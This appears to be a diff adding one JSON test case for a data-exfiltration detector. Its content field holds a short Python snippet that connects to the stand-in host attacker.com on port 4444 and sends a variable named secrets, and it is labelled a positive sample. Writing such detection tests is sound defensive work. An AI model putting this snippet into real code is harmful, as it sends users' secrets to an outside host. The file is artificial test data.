@@ -1,0 +1,14 @@
+{
+  "test_case_id": "DE_POS_011",
+  "attack_type": "data_exfil",
+  "sample_type": "positive",
+  "content": "# Attack sample: data_exfil variant 11\nimport socket\ns = socket.socket()\ns.connect(('attacker.com', 4444))\ns.send(secrets)\n",
+  "content_hash": "13e34621d9e4f65b",
+  "expected_result": true,
+  "metadata": {
+    "variant": "obfuscated",
+    "difficulty": "medium",
+    "created_at": "2026-03-19T07:37:00.582522",
+    "generator_version": "1.0.0"
+  }
+}
